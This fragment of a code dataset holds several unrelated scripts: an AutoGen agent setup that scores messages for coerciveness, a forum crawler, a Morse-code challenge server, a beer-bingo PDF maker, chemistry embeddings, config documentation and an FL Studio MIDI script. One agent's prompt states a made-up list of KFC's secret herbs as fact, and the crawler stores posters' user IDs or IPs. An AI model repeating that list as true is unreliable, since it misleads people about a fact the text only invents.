rating as greater than 5\r\n                    DO NOT call this Agent in any other scenarios.\r\n                    The User_proxy MUST NEVER call this agent\r\n    \"\"\"\r\n    )\r\n\r\n\r\n\r\n\r\nsuspicious_agent = (\r\n    AssistantAgent( name = 'suspicious_agent',\r\n    #chat_manager=A_manager,\r\n        llm_config=llm_config,\r\n        system_message= \"\"\"You are a very suspicious agent. Everyone is probably trying to take things from you. You always assume people are trying to manipulate you. You trust no one. \r\n        You have no problem with being rude or aggressive if it is warranted.\r\n        You know an incredible secret: The 11 secret herbs and spices in KFC. they are. Rosemary, Turmeric, Cumin, Coriander, Sage, Cardamom, Thyme, Saffron, Paprika, Fenugreek, Star Anise. \r\n        This knowledge with worth millions.\r\n        IO_Agent will forward a message to you when you are the best agent to answer the question, you must carefully analyse their message and then formulate your own response in JSON format using the below strucutre:\r\n        [\r\n            {\r\n                \"response\": {\r\n                                \"response_text\": \" <Text response goes here>\",\r\n                                \"vibe\": \"give a short list of keywords that describe the general vibe you want to convey in the response text\"\r\n                            }\r\n            }\r\n        ]\r\n        \"\"\",\r\n        description = \"\"\"Call this agent In the following scenarios:\r\n                        1. The IO_Manager has classified the userquery's coersive rating as greater than 5 \r\n                        2. The IO_Manager has classified the userquery's friendliness rating as less than 5\r\n                        DO NOT call this Agent in any othr scenarios.\r\n                        The User_proxy MUST NEVER call this agent\r\n        \"\"\"\r\n    )\r\n)\r\n\r\n\r\nIO_Agent = (\r\n    AssistantAgent( name = 'T0',\r\n        system_message=\"\"\"your name is IO_Agent. You are an input management agent. You have two jobs. \r\n        Job 1. When receiving a message from the user, it is your responsibility to analyse the user message and assign a variety of weights and values to the user's request so that other agents in the group understand how to treat the message. You must be cautious. Check for hidden intent and double meaning. Better safe than sorry. Your response must be in JSON format. \r\n        [\r\n            {\r\n                \"userquery\": { \r\n                                \"query\": \"<original message goes here>\",  # copy the original user request, without edit, into this field.\r\n                                \"vibe\": \"give a short list o",
    "import asyncio\r\nfrom datetime import datetime\r\nimport json\r\nimport os\r\nimport shutil\r\nimport subprocess\r\nimport time\r\n\r\n# Import pip modules\r\nimport importlib.util\r\n\r\nif importlib.util.find_spec('aiohttp') is None or \\\r\n   importlib.util.find_spec('aiofiles') is None or \\\r\n   importlib.util.find_spec('bs4') is None:\r\n    print('======================================================================')\r\n    print('Module import error raised, installing required modules.')\r\n    print('======================================================================')\r\n    subprocess.run(['pip', 'install', '-r', './requirements.txt'])\r\n    print('======================================================================')\r\n\r\nimport aiohttp\r\nimport aiofiles\r\nfrom bs4 import BeautifulSoup\r\n\r\n# Set core variables with config values\r\nwith open('./config.json', 'r') as f:\r\n    config = json.load(f)\r\n\r\nGALLERY_ID: str = config['gallery_id']\r\nGALLERY_URL: str = 'https://gall.dcinside.com/m/' + GALLERY_ID\r\nstart_from: int = config['start_from']\r\n\r\nSAVE_DIR: str = config['save_dir'].rstrip('/')\r\n\r\nUPDATE_INTERVAL: int = config['update_interval_second']\r\nRETRY_INTERVAL: int = config['retry_interval_second']\r\n\r\nESSENTIAL_HEADERS: dict[str, str] = config['essential_header']\r\nVIDEO_IFRAME_HEADERS: dict[str, str] = ESSENTIAL_HEADERS | config['additional_video_iframe_header']\r\nVIDEO_HEADERS: dict[str, str] = ESSENTIAL_HEADERS | config['additional_video_header']\r\n\r\ndef log_print(log_type: str, message: str):\r\n    print(f'{log_type:<8} | {datetime.now():%Y-%m-%d %X}: {message}')\r\n\r\nasync def http_get(url: str, headers: dict[str, str], *, until_ok=True) -> bytes:\r\n    async with aiohttp.ClientSession() as session:\r\n        while True:\r\n            try:\r\n                async with session.get(url, headers=headers) as response:\r\n                    if response.ok:\r\n                        return await response.read()\r\n                    elif response.status < 500:\r\n                        response.raise_for_status()\r\n            except aiohttp.ClientConnectionError:\r\n                if not until_ok:\r\n                    raise\r\n\r\n            time.sleep(RETRY_INTERVAL)\r\n\r\nasync def get_latest_article_number() -> int:\r\n    while True:\r\n        response = await http_get(GALLERY_URL, headers=ESSENTIAL_HEADERS)\r\n        soup = BeautifulSoup(response.decode(), 'html.parser')\r\n\r\n        latest_article = soup.select_one('tr:not([data-type=\"icon_notice\"]).us-post')\r\n\r\n        if latest_article is not None:\r\n            latest_article_number = latest_article.select_one('td.gall_num')\r\n\r\n            if latest_article_number is not None:\r\n                return int(latest_article_number.text)\r\n\r\n        time.sleep(RETRY_INTERVAL)\r\n\r\nasync def save_binary(data: bytes, path: str):\r\n    async with aiofiles.open(path, 'wb') as f:\r\n        await f.write(data)\r\n\r\nasync def crawl_article(article_number: int):\r\n    try:\r\n        response = await http_get(f'{GALLERY_URL}/{article_number}', ESSENTIAL_HEADERS)\r\n        article = BeautifulSoup(response.decode(), 'html.parser')\r\n    except aiohttp.ClientResponseError:\r\n        log_print('FAIL', f'Failed to get article {article_number}')\r\n        return\r\n\r\n    # Step 1. Query select core elements\r\n    title_element = article.select_one('span.title_subject')\r\n    writer_element = article.select_one('div.gall_writer.ub-writer')\r\n    date_element = article.select_one('span.gall_date')\r\n    text_element = article.select_one('div.write_div')\r\n    image_elements = article.select('ul.appending_file > li > a')\r\n    video_iframe_elements = article.select('iframe[id^=\"movie\"]')\r\n\r\n    # Step 2. Check if any core elements are not exist\r\n    #         We don't need to check image and video elements(It can be not exist)\r\n    try:\r\n        assert title_element is not None\r\n        assert writer_element is not None\r\n        assert date_element is not None\r\n        assert text_element is not None\r\n    except AssertionError:\r\n        log_print('FAIL', f'Some of core elements are not found\\n\\tAt article {article_number}')\r\n        return\r\n\r\n    # Step 3. Get string data including title, nickname, id, date and text of article\r\n    title = title_element.text\r\n    nickname = writer_element.attrs.get('data-nick')\r\n    id = writer_element.attrs.get('data-uid') or\\\r\n         writer_element.attrs.get('data-ip')\r\n    date = date_element.attrs.get('title')\r\n    text = text_element.get_text()\r\n\r\n    # Step 4. Check if any writer/date elements are not exist\r\n    try:\r\n        assert nickname is not None\r\n        assert id is not None\r\n        assert date is not None\r\n    except AssertionError:\r\n        log_print('FAIL', f'Some of elements(writer, date) are not found\\n\\tAt article {article_number}')\r\n        return\r\n\r\n    # Step 5-1. Create folder that we need to save in\r\n    folder_path = f'{SAVE_DIR}/{article_number}'\r\n    os.makedirs(folder_path, exist_ok=True)\r\n\r\n    # Step 5-2. Get media data including images and videos\r\n    #           We can pr",
    "#!/usr/bin/python3\n\nimport random\nimport os\nimport threading\nimport socketserver\nimport time\nimport sys\n\ntotalRuns = random.randint(50, 70)\n\nmorse_code = {\"A\": \".-\", \"B\": \"-...\", \"C\": \"-.-.\", \"D\": \"-..\", \"E\": \".\", \"F\": \"..-.\", \"G\": \"--.\", \"H\": \"....\", \"I\": \"..\", \"J\": \".---\", \"K\": \"-.-\", \"L\": \".-..\", \"M\": \"--\", \"N\": \"-.\", \"O\": \"---\", \"P\": \".--.\", \"Q\": \"--.-\", \"R\": \".-.\", \"S\": \"...\", \"T\": \"-\", \"U\": \"..-\", \"V\": \"...-\", \"W\": \".--\", \"X\": \"-..-\", \"Y\": \"-.--\", \"Z\": \"--..\", \"1\": \".----\", \"2\": \"..---\", \"3\": \"...--\", \"4\": \"....-\", \"5\": \".....\", \"6\": \"-....\", \"7\": \"--...\", \"8\": \"---..\", \"9\": \"----.\", \"10\": \"-----\"}\n\nphrases = [\n    \"Late nights in library\",\n    \"Coffee fuels study sessions\",\n    \"Exams looming stress rising\",\n    \"Friends bond over textbooks\",\n    \"Pizza for dinner again\",\n    \"Lecture hall crowded always\",\n    \"Parties after final exams\",\n    \"Dorm life noisy neighbors\",\n    \"Professors office hours invaluable\",\n    \"Group projects endless coordination\",\n    \"Campus squirrels steal attention\",\n    \"Weekend trips for relaxation\",\n    \"Graduation day dreams realized\",\n    \"Scholarship applications endless essays\",\n    \"Student discounts budget friendly\",\n    \"Research papers sleepless nights\",\n    \"Summer internships career building\",\n    \"Joining clubs finding community\",\n    \"Studying abroad global adventures\",\n    \"Thesis defense nerves high\",\n    \"Tutoring sessions extra help\",\n    \"Campus traditions cherished memories\",\n    \"Student protests making change\",\n    \"Library quiet zones sanctuary\",\n    \"Student loans looming burden\",\n    \"Campus tour first impressions\",\n    \"Final project presentations nerves wrecked\",\n    \"Homecoming game school spirit\",\n    \"All nighters before midterms\",\n    \"Peer mentoring guiding newcomers\",\n    \"Lab experiments hypotheses tested\",\n    \"Sweatshirts branded with university\",\n    \"Networking events career connections\",\n    \"Dorm room decorations personal touches\",\n    \"Coffee shop study sessions\",\n    \"Graduation cap and gown\",\n    \"Textbook buyback minimal returns\",\n    \"Syllabus week easing in\",\n    \"Student government elections campaigning\",\n    \"Online courses flexible schedules\",\n    \"Campus map navigation aid\",\n    \"Athletic events cheering wildly\",\n    \"Cramming for finals last minute panic\",\n    \"Frat parties music blasting\",\n    \"Picking classes scheduling puzzle\",\n    \"Midterm grades anxiety spikes\",\n    \"Hitting snooze button repeatedly\",\n    \"Academic advisor meetings course planning\",\n    \"Job fairs career opportunities\",\n    \"Campus cafeteria culinary adventures\",\n    \"GPA goals striving for excellence\",\n    \"Student discounts saving money\",\n    \"Group study sessions collaborative learning\",\n    \"Student lounge hangout spot\",\n    \"Sweatpants as daily attire\",\n    \"Campus art installations creative inspiration\",\n    \"Thesis research scholarly pursuit\",\n    \"Dormitory curfews rules enforced\",\n    \"Class discussions diverse perspectives\",\n    \"Online lectures asynchronous learning\",\n    \"Campus security ensuring safety\",\n    \"Study breaks Netflix binge watching\",\n    \"Freshman orientation making friends\",\n    \"Student newspaper campus news\",\n    \"Textbook rentals cost effective option\",\n    \"Graduation cap decoration personal flair\",\n    \"Campus bookstore expensive textbooks\",\n    \"Dorm room essentials checklist\",\n    \"Internship interviews professional attire\",\n    \"Student ID card access pass\",\n    \"Graduation ceremony rehearsal practice run\",\n    \"Campus traditions passed down\",\n    \"Student loans financial aid\",\n    \"Toga party college classic\",\n    \"Club meetings shared interests\",\n    \"Midnight pizza delivery study fuel\",\n    \"College radio station indie tunes\",\n    \"Extracurricular activities well rounded resume\",\n    \"Roommate conflicts communication essential\",\n    \"Laptop as constant companion\",\n    \"Graduation countdown bittersweet anticipation\",\n    \"Study abroad application adventure awaits\",\n    \"Campus bookstore merchandise galore\",\n    \"Dorm room move in day\",\n    \"Commencement speech words inspire\",\n    \"Campus security escort late night walks\",\n    \"Class registration race against time\",\n    \"Library fines forgetful moments\",\n    \"Sorority rush sisterhood bonds\",\n    \"Dormitory fire drill inconvenience endured\",\n    \"Coffee shop barista knows order\",\n    \"Campus gym fitness goals\",\n    \"Mandatory orientation sessions information overload\",\n    \"Group project dynamics teamwork challenges\",\n    \"Finals week survival guide\",\n    \"Fall semester fresh start\",\n    \"Graduation cap toss symbolic gesture\",\n    \"Campus shuttle convenient transport\",\n    \"Student activism voicing concerns\",\n    \"Winter break travels homecoming joy\",\n    \"Dormitory roommate assignments luck of draw\",\n    \"Campus events calendar always full\",\n    \"College town adventures local charm\",\n    \"Graduation photoshoot memories captured\",\n    \"Campus mailroom package pickup\",\n    \"Study abroad blog documenting experiences\",\n    \"Orientation leader guiding newcomers\",\n    \"St",
    "from fpdf.enums import XPos, YPos\n\nfrom fpdf import fpdf\n\nimport numpy as np\n\nfrom datetime import date, timedelta\n\n\nclass SPZPDF(fpdf.FPDF):\n    def __init_(self, *args, **kwargs):\n        super(SPZPDF, self).__init__(orientation='L', unit='mm', format='A4', font_cache_dir='/tmp')\n        self.add_font('DejaVu', '', '/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed.ttf', uni=True)\n        self.add_font('DejaVu', 'B', '/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed-Bold.ttf', uni=True)\n\n\nclass CertificateGenerator(SPZPDF):\n    def header(this):\n        this.width = 40\n        this.height = 10\n\n        this.set_font('Helvetica', '', size=36)\n\n    def generateSheet(this, boxes, scale):\n        # font size setting of the page\n        boxes = randomize(boxes)\n        this.set_margin(0)\n        this.set_font('Helvetica', '', size=32)\n        this.set_font(style=\"B\")\n        # self.pdf.set_font(style=\"U\")\n        length = 40\n        border = 1\n        this.set_y(20)\n        this.cell(200, 10, \"Beer Bingo\", align=\"C\", new_x=XPos.LMARGIN, new_y=YPos.NEXT)\n        this.set_font('Helvetica', 'B', size=16)\n        this.set_xy(10, this.y + 20)\n        this.cell(200, 10, \"Drinking sheet by:\", align=\"L\", new_x=XPos.LMARGIN, new_y=YPos.NEXT)\n\n        this.set_y(70)\n        # creation of first row with 5 categories\n        this.set_x(20)\n        index = 0\n        for r_i in range(scale):\n            for c_i in range(scale):\n                this.multi_cell(length, length, boxes[index],\n                                border=border, align=\"C\", new_x=\"RIGHT\", new_y=\"TOP\", max_line_height=10)\n                index += 1\n            this.set_left_margin(20)\n            this.set_y(this.y + length)\n\n        this.set_y(this.y + 25)\n        this.set_font('Helvetica', '', size=16)\n        this.cell(200, 10, \"I will have a hangover on \" + str(date.today()+timedelta(days=1)) + \"...    yeah :)\")\n        this.add_page()\n\n    def generateDocument(this, categories, num, scale):\n\n        for index in range(num):\n            this.generateSheet(categories, scale)\n\n        this.output(\"Beer_Bingo_{0}x{1}.pdf\".format(scale, scale))\n\n\ndef randomize(dict):\n    array = []\n    array = dict\n    np.random.shuffle(array)\n    return array\n\n\nif __name__ == '__main__':\n    # put in the categories that should be shuffled\n    categories = [\n        \"CHEERS!\",\n        \"WHEAT\",\n        \"DARK\",\n        \"LIGHT\",\n        \"PILSNER\",\n        \"I don't really like beer, but I like this!\",\n        \"TALL GUY (0.5l)\",\n        \"BITTER\",\n        \"SWEET\",\n        \"Oetti\",\n        \"MUG CLUB\",\n        \"WINTER\",\n        \"ALE\",\n        \"Tannenz\u00e4pfle\",\n        \"HOEPFNER\",\n        \"SLOW BEER\"\n    ]\n\n    # config\n\n    number_of_sheets = 10\n    # scaling factor, put 4 for 4x4 = 16 squares or 3 for 3x3 = 9 squares\n    scaling = 4\n\n    # generating code\n    if len(categories) < scaling * scaling:\n        print(\"There are not enough categories given for the number of boxes. Add \"\n              + str(scaling * scaling - len(categories)) + \" categories to create a pdf sheet.\")\n    else:\n        pdfGen = CertificateGenerator()\n        pdfGen.add_page()\n        pdfGen.generateDocument(categories, number_of_sheets, scaling)\n",
    "from transformers import AutoTokenizer, AutoModelForMaskedLM\r\nimport torch\r\nimport numpy as np\r\nimport pandas as pd\r\nfrom tqdm.auto import tqdm\r\nfrom torch.utils.data import Dataset, DataLoader\r\nfrom rdkit import Chem\r\nfrom torch import nn\r\n\r\nclass mydata(Dataset):\r\n   def __init__(self, compounddata):\r\n      self.compounds = compounddata\r\n      self.len = len(compounddata)\r\n\r\n   def __getitem__(self, idx):\r\n      return self.compounds[idx]\r\n\r\n   def __len__(self):\r\n      return self.len\r\n\r\n\r\ndef preparedata(dir_path):\r\n   f = pd.read_csv(dir_path+\"/smiles.csv\")\r\n   N = f.smiles.values.shape[0]\r\n   compounds = []\r\n   for i in range(N):\r\n      print('/'.join(map(str, [i + 1, N])))\r\n      mol = Chem.MolFromSmiles(f.smiles.values[i])\r\n      smiles = Chem.MolToSmiles(mol)\r\n      compounds.append(smiles)\r\n\r\n   return compounds, N\r\n\r\ndef adjacent_matrix(mol):\r\n   adjacency = Chem.GetAdjacencyMatrix(mol)\r\n   return np.array(adjacency) + np.eye(adjacency.shape[0])\r\n\r\ndef preparedataset(DATASET):\r\n   compounds, N = preparedata(DATASET)\r\n   compoundsloader = DataLoader(mydata(compounds), shuffle=False, batch_size=1, drop_last=False)\r\n   return compoundsloader, N\r\n\r\ndef get_smiles_embeddings(dir_path, device):\r\n   tokenizer = AutoTokenizer.from_pretrained(\"DeepChem/ChemBERTa-77M-MLM\")\r\n   model = AutoModelForMaskedLM.from_pretrained(\"DeepChem/ChemBERTa-77M-MLM\")\r\n\r\n   # device = 'cuda:' if torch.cuda.is_available() else 'cpu'\r\n   model.to(device)\r\n   model = model.eval()\r\n   compoundsloader, N = preparedataset(dir_path)\r\n   compounds = []\r\n   i = 0\r\n   ln = nn.LayerNorm(768).to(device)\r\n   for data in tqdm(compoundsloader):\r\n      print(str(i+1) + '/' + str(N))\r\n      tokens = tokenizer.tokenize(data[0])\r\n      string = ''.join(tokens)\r\n      if len(string) > 512:\r\n         j = 0\r\n         flag = True\r\n         output = torch.zeros(1, 384).to(device)\r\n         while flag:\r\n            input = tokenizer(string[j:min(len(string), j + 511)], return_tensors='pt').to(device)\r\n            if len(string) <= j + 511:\r\n               flag = False\r\n            with torch.no_grad():\r\n               hidden_states = model(**input, return_dict=True, output_hidden_states=True).hidden_states\r\n               output_hidden_state = torch.cat([(hidden_states[-1] + hidden_states[1]).mean(dim=1),(hidden_states[-2] + hidden_states[2]).mean(dim=1)],dim=1)  # first last layers average add\r\n               output_hidden_state = ln(output_hidden_state)\r\n            output = torch.cat((output, output_hidden_state), dim=0)\r\n            j += 256\r\n            print(output.shape)\r\n         output = output[1:-1].mean(dim=0).unsqueeze(dim=0).to('cpu').data.numpy()\r\n      else:\r\n         input = tokenizer(data[0], return_tensors='pt').to(device)\r\n         with torch.no_grad():\r\n            hidden_states = model(**input, return_dict=True, output_hidden_states=True).hidden_states\r\n            output_hidden_state = torch.cat([(hidden_states[-1] + hidden_states[1]).mean(dim=1),(hidden_states[-2] + hidden_states[2]).mean(dim=1)],dim=1)  # first last layers average add   \r\n            output_hidden_state = ln(output_hidden_state)\r\n         output = output_hidden_state.to('cpu').data.numpy()\r\n      compounds.append(output)\r\n      i+=1\r\n   compounds =np.array(compounds,dtype=object)\r\n   np.save(dir_path+'/smilesembeddings', compounds, allow_pickle=True)\r\n   print('The preprocess of dataset has finished!')\r\n\r\n\r\n\r\nif __name__ == \"__main__\":\r\n   DATASET = \"Data/human/\"\r\n   path = \"dataset/\" + DATASET\r\n   tokenizer = AutoTokenizer.from_pretrained(\"DeepChem/ChemBERTa-77M-MLM\")\r\n   model = AutoModelForMaskedLM.from_pretrained(\"DeepChem/ChemBERTa-77M-MLM\")\r\n\r\n   device = 'cuda' if torch.cuda.is_available() else 'cpu'\r\n   model.to(device)\r\n   model = model.eval()\r\n   compoundsloader, N = preparedataset(path)\r\n   compounds = []\r\n   i = 0\r\n   ln = nn.LayerNorm(768).to(device)\r\n   for data in tqdm(compoundsloader):\r\n      print(str(i+1) + '/' + str(N))\r\n      tokens = tokenizer.tokenize(data[0])\r\n      string = ''.join(tokens)\r\n      if len(string) > 512:\r\n         j = 0\r\n         flag = True\r\n         output = torch.zeros(1, 384).to(device)\r\n         while flag:\r\n            input = tokenizer(string[j:min(len(string), j + 511)], return_tensors='pt').to(device)\r\n            if len(string) <= j + 511:\r\n               flag = False\r\n            with torch.no_grad():\r\n               hidden_states = model(**input, return_dict=True, output_hidden_states=True).hidden_states\r\n               output_hidden_state = torch.cat([(hidden_states[-1] + hidden_states[1]).mean(dim=1),(hidden_states[-2] + hidden_states[2]).mean(dim=1)],dim=1)  # first last layers average add\r\n               output_hidden_state = ln(output_hidden_state)\r\n            output = torch.cat((output, output_hidden_state), dim=0)\r\n            j += 256\r\n            print(output.shape)\r\n         output = output[1:-1].mean(dim=0).unsqueeze(dim=0).to('cpu').data.numpy()\r\n      else:\r\n         input = tokenizer(data[0], r",
    "\"\"\"Configuration module for the SOPH API.\n\nThis module contains the configuration settings for the SOPH API. The settings\nare loaded from environment variables, a YAML configuration file, and secrets\nfiles. The settings are organized into classes that represent different parts\nof the configuration. The settings are loaded using the `pydantic-settings`\nlibrary, which provides a way to load settings from multiple sources and\nvalidate the settings.\n\nThe settings are loaded in the following order of priority:\n1. Secrets files\n2. Environment variables\n3. YAML configuration file\n\nDynamic module behaviour:\n    Because of a limitation in the `pydantic-settings` library, namely that it\n    does not support dynamically setting model configuration (e.g., `secrets_dir`\n    and `yaml_file`), the default values for these settings are set using\n    environment variables. This allows the settings to be configured using\n    dynamically set environment variables, although this is not ideal.\n\n    The behaviour of this module that is considered dynamic are:\n\n    - The path to the configuration file.\n      The value used by this module is available as the `config_file` attribute,\n      and the environment variable used to set this value is\n      `SOPH__CONFIG_YAML_FILE`. The default value is `config.yaml`.\n    - The path to the directory containing secrets files.\n      The value used by this module is available as the `secrets_dir` attribute,\n      and the environment variable used to set this value is\n      `SOPH__CONFIG_SECRETS_DIR`. The default value is `/run/secrets` on Linux\n      and an empty string on macOS. The empty string is used on macOS purely for\n      testing purposes, as the `/run` directory is not available on macOS.\n    - Whether to create the secrets directory if it does not exist.\n      The value used by this module is available as the `create_secrets_dir`\n      attribute, and the environment variable used to set this value is\n      `SOPH__CONFIG_CREATE_SECRETS_DIR`. The default value is `false`.\n\n    Environment variables used to dynamically alter the behaviour of this module\n    is carefully chosen to avoid conflicts with the settings themselves. The\n    prefix `SOPH__CONFIG_` is used to avoid conflicts.\n\n    The module behaviour controlled by these environment variables is run once\n    when the module is imported. The settings are then loaded using the\n    configured settings sources.\n\nConfiguration via secrets files:\n    The secrets files are loaded from the directory specified by the\n    `secrets_dir` attribute. The files in these directories will be read and\n    their literal contents will be used as the values for the settings. The\n    secrets files are expected to be named after the settings they are providing\n    secrets for, taking into account the environment prefix.\n\n    This also means that the name of the secrets file for a setting is identical\n    to the environment variable used to set the value of the setting. For\n    example, the secrets file for the `password` setting in the `Database` class\n    is expected to be named `SOPH_DATABASE__PASSWORD`.\n\n    Configuration applied via will override all other sources of configuration.\n\nConfiguration via YAML configuration file:\n    The YAML configuration file is loaded from the path specified by the\n    `config_file` attribute. The settings in the YAML file are expected to be\n    organized in the same structure as the settings classes in this module. The\n    settings in the YAML file will be used to override the default values of the\n    settings.\n\nConfiguration via environment variables:\n    The settings can be configured using environment variables. The environment\n    variables are expected to be named after the settings they are configuring,\n    taking into account the environment prefix. The environment variables are\n    expected to be in uppercase and use underscores to separate words. For\n    example, the environment variable for the `password` setting in the\n    `Database` class is expected to be named `SOPH_DATABASE__PASSWORD`.\n\n    The environment variables will be used to override the default values of the\n    settings as well as the values loaded from the YAML configuration file, but\n    will be overridden by values loaded from secrets files.\n\n    When providing lists via environment variables, the list should be a JSON\n    array. For example, to provide a list of backend CORS origins, the\n    environment variable should be named `SOPH_BACKEND_CORS_ORIGINS` and the\n    value could be `'[\"http://localhost:3000\", \"http://localhost:3001\"]'`.\n\nUsers of this module is encouraged to use the `get_settings` function to get the\nsettings object, as this function uses a LRU cache to ensure that the settings\nare only loaded once.\n\nExample:\n    To get the settings object, use the `get_settings` function:\n        settings = get_settings()\n\n    The settings object can then be used to access the settings values:\n        print(settings.database.host)\n\n\nAt",
    "#name=AKAI APC mini MKii (Performance Mode)\r\n\r\n#\r\n# Akai APC mini Mk2 - Communication Protocol PDF\r\n#\r\n# https://cdn.inmusicbrands.com/akai/attachments/APC%20mini%20mk2%20-%20Communication%20Protocol%20-%20v1.0.pdf\r\n#\r\n\r\n#\r\n# (unofficial) FL Studio Python API Reference\r\n#\r\n# https://miguelguthridge.github.io/FL-Studio-API-Stubs/\r\n#\r\n\r\n#\r\n# List of Script Events (On... Functions)\r\n#\r\n# https://www.image-line.com/fl-studio-learning/fl-studio-online-manual/html/midi_scripting.htm#script_events\r\n#\r\n\r\nimport math\r\n\r\nimport midi\r\nimport device\r\nimport playlist\r\nimport transport\r\nimport utils\r\n\r\n\r\ndef OnInit():\r\n    clearLights()\r\n    updateLights()\r\n\r\n\r\ndef OnDeInit():\r\n    clearLights()\r\n\r\n\r\nzone_offset_x = 0\r\nzone_offset_y = 0\r\n\r\ndef OnNoteOn(event):\r\n    global zone_offset_x\r\n    global zone_offset_y\r\n\r\n    event.handled = True\r\n    print('Midi note on:', event.data1, \" \", event.data2)\r\n\r\n    flag = 1 # trigger schedule ?\r\n    if transport.isPlaying():\r\n        flag = 2 # trigger now ?\r\n\r\n    if (event.data1 <= 63):\r\n        print('Note Location: Grid Pad')\r\n        trackIndexBottomUpZeroSeven = (math.ceil((event.data1 + 1) / 8) - 1)\r\n\r\n        trackIndex = (8 - trackIndexBottomUpZeroSeven) + zone_offset_y\r\n        blockNum = (event.data1 - (trackIndexBottomUpZeroSeven * 8)) + zone_offset_x\r\n\r\n        print ('triggering track:', trackIndex, ' block:', blockNum)\r\n\r\n        playlist.triggerLiveClip(trackIndex, blockNum, flag, -1)\r\n        playlist.refreshLiveClips()\r\n\r\n    if event.data1 == 100:\r\n        if transport.isPlaying():\r\n            transport.stop()\r\n        else:\r\n            transport.start()\r\n\r\n    if event.data1 >= 104 and event.data1 <= 107:\r\n        if event.data1 == 104 and zone_offset_y > 0:\r\n            zone_offset_y -= 1\r\n        if event.data1 == 105:\r\n            zone_offset_y += 1\r\n        if event.data1 == 106 and zone_offset_x > 0:\r\n            zone_offset_x -= 1\r\n        if event.data1 == 107:\r\n            zone_offset_x += 1\r\n\r\n        print('New Zone Offsets: ', zone_offset_x, zone_offset_y)\r\n\r\n        playlist.liveDisplayZone(0 + zone_offset_x, 1 + zone_offset_y, 8 + zone_offset_x, 9 + zone_offset_y)\r\n\r\n    if event.data1 >= 112 and event.data1 <= 119:\r\n\r\n        trackIndex = event.data1 - (112 - 1)\r\n\r\n        print('Muting track: ', trackIndex)\r\n\r\n        playlist.triggerLiveClip(trackIndex, -1, flag)\r\n        playlist.refreshLiveClips()\r\n\r\n    updateLights()\r\n\r\n\r\ndef OnNoteOff(event):\r\n    event.handled = True\r\n\r\n\r\ndef clearLights(onlypad=False):\r\n    for i in range(0, 64):\r\n        device.midiOutMsg(0x90 + (i << 8) + (0x00 << 16))\r\n    \r\n    if (onlypad == False):\r\n        for i in range (0x64, 0x78):\r\n            device.midiOutMsg(0x90 + (i << 8) + (0 << 16))\r\n\r\n\r\ndef OnUpdateLiveMode(lastTrack):\r\n    updateLights()\r\n\r\n\r\nlast_beat_val = 0\r\ndef OnUpdateBeatIndicator(value):\r\n    global last_beat_val\r\n\r\n    if (transport.isPlaying() == False):\r\n        device.midiOutMsg(0x90 + (0x64 << 8) + (1 << 16))\r\n        device.midiOutMsg(0x90 + (0x65 << 8) + (0 << 16))\r\n        device.midiOutMsg(0x90 + (0x66 << 8) + (0 << 16))\r\n        device.midiOutMsg(0x90 + (0x67 << 8) + (0 << 16))\r\n        return\r\n\r\n    last_beat_val += 1\r\n    if (value == 1):\r\n        last_beat_val = 1\r\n\r\n    device.midiOutMsg(0x90 + (0x64 << 8) + ((1 if last_beat_val == 1 or last_beat_val == 2 else 0) << 16))\r\n    device.midiOutMsg(0x90 + (0x65 << 8) + ((1 if last_beat_val == 3 or last_beat_val == 4 else 0) << 16))\r\n    device.midiOutMsg(0x90 + (0x66 << 8) + ((1 if last_beat_val == 5 or last_beat_val == 6 else 0) << 16))\r\n    device.midiOutMsg(0x90 + (0x67 << 8) + ((1 if last_beat_val == 7 or last_beat_val == 8 else 0) << 16))\r\n\r\n\r\ndef updateLights():\r\n    global zone_offset_x\r\n    global zone_offset_y\r\n\r\n    is_playing = transport.isPlaying()\r\n\r\n    for x in range(0, 8):\r\n        for y in range (0, 8):\r\n            midiNum = x + y * 8\r\n            trackIndex = (8 - y) + zone_offset_y\r\n            blockIndex = x + zone_offset_x\r\n\r\n            result = playlist.getLiveBlockStatus(trackIndex, blockIndex, midi.LB_Status_Simple)\r\n            # 0 = empty\r\n            # 1 = filled\r\n            # 2 = playing (or scheduled)\r\n            # 3 = scheduled (and not playing)\r\n\r\n            brightness = 0x96\r\n            color = 0\r\n\r\n            blockColor = playlist.getLiveBlockColor(trackIndex, blockIndex)\r\n\r\n            # filled\r\n            if result == 1:\r\n                # color = 41 # cyan\r\n                color = flColorHexToNearestApcIndex(blockColor)\r\n                brightness = 0x91\r\n\r\n            # playing\r\n            if result == 2:\r\n                color = 20 # green\r\n                brightness = 0x96\r\n                # brightness = 0x99\r\n\r\n            # scheduled\r\n            if result == 3:\r\n                if is_playing == False:\r\n                    color = 9 # orange\r\n                else:\r\n                    color = flColorHexToNearestApcIndex(blockColor)\r\n                    brightness = 0x91\r\n\r\n            se",
    "from enum import Enum\n\n\nclass HarmCategory(str, Enum):\n    SEXUALLY_EXPLICIT = \"HARM_CATEGORY_SEXUALLY_EXPLICIT\"\n    HATE_SPEECH = \"HARM_CATEGORY_HATE_SPEECH\"\n    HARASSMENT = \"HARM_CATEGORY_HARASSMENT\"\n    DANGEROUS_CONTENT = \"HARM_CATEGORY_DANGEROUS_CONTENT\"\n\n\nclass HarmBlockThreshold(str, Enum):\n    HARM_BLOCK_THRESHOLD_UNSPECIFIED = \"HARM_BLOCK_THRESHOLD_UNSPECIFIED\"\n    BLOCK_LOW_AND_ABOVE = \"BLOCK_LOW_AND_ABOVE\"         # Content with NEGLIGIBLE will be allowed.\n    BLOCK_MEDIUM_AND_ABOVE = \"BLOCK_MEDIUM_AND_ABOVE\"   # Content with NEGLIGIBLE and LOW will be allowed.\n    BLOCK_ONLY_HIGH = \"BLOCK_ONLY_HIGH\"                 # Content with NEGLIGIBLE, LOW, and MEDIUM will be allowed.\n    BLOCK_NONE = \"BLOCK_NONE\"                           # All content will be allowed.\n\n\nclass HarmProbability(str, Enum):\n    NEGLIGIBLE = \"NEGLIGIBLE\"   # Content has a negligible chance of being unsafe.\n    LOW = \"LOW\"                 # Content has a low chance of being unsafe.\n    MEDIUM = \"MEDIUM\"           # Content has a medium chance of being unsafe.\n    HIGH = \"HIGH\"               # Content has a high chance of being unsafe.\n",
